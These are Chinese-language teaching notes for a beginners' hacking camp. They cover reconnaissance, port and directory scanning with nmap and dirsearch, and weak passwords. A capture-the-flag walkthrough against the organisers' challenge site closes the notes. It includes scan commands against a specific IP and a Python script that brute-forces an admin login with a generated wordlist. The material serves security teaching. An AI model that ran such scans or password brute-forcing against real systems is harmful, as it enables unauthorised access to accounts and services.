# 駭客體驗營

## 什麼是駭客
### [wiki](https://zh.wikipedia.org/wiki/%E9%BB%91%E5%AE%A2)

## 資料探勘
### Recon (Reconnaissance)
* 資訊偵查
* 針對目標搜集資訊
    * ip address
    * open port 
        * service
    * directory
### ip
* internet protocol
* 主機在網路中的位置
* 分成兩種
    * IPv4
        * 127.0.0.1
    * IPv6
        * 2001:0db8:85a3:08d3:1319:8a2e:0370:7344
### domain
* ip 太難記，發明了 domain name 方便記憶
* 透過 DNS server 將 domain 轉成 ip
* tool 
    * dig
    * nslookup
### DNS server 
### DNS proxy server

## port
### open port
* 一個 port 對應一個服務
* 常見的 port
    * 22 : ssh
    * 80 : http
    * 443 : https
### scan open port
* 對一台主機掃描開放的 port 
    * 可以知道開啟了什麼服務
    * 給駭客多了一點機會
### exploit
* 如果知道服務名稱還有版本號
    * 找歷史漏洞 CVE PoC

## information leak 
### file based server
* 常發生在 file based server
* 會有敏感資訊外洩
    * username / password
    * source code
    * file path
    * config
* 在網頁上看不到卻真實存在在伺服器中

## 工具
### nmap
* [github](https://github.com/nmap/nmap)
* install
    * ```bash=
        ./configure
        make
        make install
        ```
    * `sudo apt install nmap`
* usage
    * 基本掃描
        * `nmap <ip> <ip> ... `
    * 偵測主機的作業系統與各種服務的版本
        * `nmap -A <ip>`
    * 偵測主機的作業系統
        * `nmap -O <ip>`
    * 偵測主機各種服務的版本
        * `nmap -sV <ip>`
    * 掃描在防火牆保護下的主機
        * `nmap -Pn <ip>`
    * 指定連接埠
        * `nmap -p 80 <ip>`
    * 指定多個連接埠
        * `nmap -p 80,443 <ip>`
    * 指定連接埠範圍
        * `nmap -p 1-10000 <ip>`

### dirsearch
* [github](https://github.com/maurosoria/dirsearch)
* install 
    * `git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch`
    * `pip3 install -r requirements.txt`
* usage
    * `python3 dirsearch.py -u <URL> -e <EXTENSIONS>`

### dig
* usage
    * 

### pydictor
* [github](https://github.com/LandGrey/pydictor)
* install
    * `git clone https://www.github.com/landgrey/pydictor.git`
* usage
    * `python3 pydictor.py --sedb`
    * `set email your_email`

## 弱密碼
### 概念
* 容易被猜到的密碼
    * 個人資訊
        * 生日
        * 身分證字號
        * 電話
    * 簡單的密碼
        * 鍵盤排列
            * qwertyuiop
        * 英文單字
            * password
        * 一串數字
            * 12345678
    * 注音對應英文
        * 我的密碼
            * ji32k7au4a83
* 弱密碼有區域性
    * 台灣會用注音輸入對應英文
    * 對外國人來說沒有意義
    * [相關文章](https://www.upmedia.mg/news_info.php?SerialNo=58781)
### 檢查一下自己的密碼
* [have i been pwned](https://haveibeenpwned.com/Passwords)
* 輸入自己的密碼看看是不是已經被公諸於世了

## 解題流程
> https://digme.ntut.club
### First step
* 首先訪問網頁會看到 Can you dig me?
* 這時候我們稍微 dig 一下
* 最有可能放不同資訊的地方是 txt
    * `dig digme.ntut.club txt`
* 之後可以拿到一個 blog 的網址
    > https://blog.ntut.club

### Second step
* 再來訪問網頁，可以看到是一個部落格
    * 裡面的內容是弱密碼可能的選項
* 最下面有 server 的 ip
* 這時候，我們用 nmap 稍微掃描一下，規則上說 1-3000 就好
    * `nmap -p 1-3000 34.122.227.62`
* 之後可以看到一個特別的 port 2087

### Third step
* 這時候我們訪問 2087 port 
    > https://blog.ntut.club:2087
* 我們可以看到只有一個 pizza 的頁面以及 nothing here 的 title
* 如果我們要拿到網頁中沒有給出的資料，我們需要用 dirsearch 做目錄的掃描
    * 規則上說掃描到根目錄就好
    * `python3 dirsearch.py -u https://blog.ntut.club:2087/ -e php -b`
* 之後可以看到一個特別的目錄 `/admin` 或是 `/admin.php`

### Forth step
* 我們訪問一下 https://blog.ntut.club:2087/admin
    * 可以看到一個輸入密碼的頁面
* 要用 https://blog.ntut.club/ 中的內容來猜密碼
* 用 pydictor 來輔助我們
    * `python pydictor.py --sedb`
    * `set ename bob`
    * `set email thisisbob@gmail.com`
    * `set usedchar pizza`
    * `set phone 0912345678`
    * `run`
* 之後用 python 過濾一下生成的密碼，規則上說密碼是英文小寫
    ```python3=
    import requests
    from colorama import init, Fore, Back

    init(autoreset=True)
    url = 'https://blog.ntut.club:2087/admin'

    def alpha(password):
        for i in password:
            if (i >= 'a' and i <= 'z'):
                continue
            else:
                return False

        return True

    with open('sedb_201900.txt', 'r') as f:
        for password in f.readlines():
            password = password.replace('\n', '')

            if (alpha(password)):
                if (requests.post(url, data={'password':password}).status_code == 200):
                    print(Fore.GREEN + password)
                    break
                else:
                    print(Fore.RED + password)
            else:
                continue
    ```
* 得知密碼是 `thisisbobpizza`

## 結論
### 密碼長度與強度的重要性
* 如果沒有在規則上說過密碼都是英文小寫，再加上網頁每收到一組密碼都會停個三秒，破解的時間會無線拉長
* 希望各位在這次的體驗營之後能體驗到駭客之餘，對於自己的密碼能更注意歐
